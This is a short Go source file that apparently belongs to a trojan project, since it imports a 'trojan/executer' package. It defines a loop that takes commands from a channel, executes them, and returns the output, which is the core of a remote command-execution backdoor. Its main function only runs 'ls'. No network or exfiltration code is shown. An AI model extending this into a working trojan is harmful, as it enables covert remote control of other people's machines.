package main

import (
	"fmt"
	"trojan/executer"
)

var cmdChan = make(chan string)
var resChan = make(chan []byte)



func recvCmdSendRes(){
	for true {
		// 从管道中读取命令
		cmd := <-cmdChan
		// 执行命令
		if cmd == "abortabortabort"{
			break
		}
		res, err := executer.DoCommand(cmd, []string{}, 2)
		if err != nil {
			panic(err)
		}
		// 将结果发送到管道中
		resChan <- res
	}
}

func main() {
	res, err := executer.DoCommand("ls", []string{}, 2)
	if err != nil {
		panic(err)
	}
	fmt.Println(string(res))
}
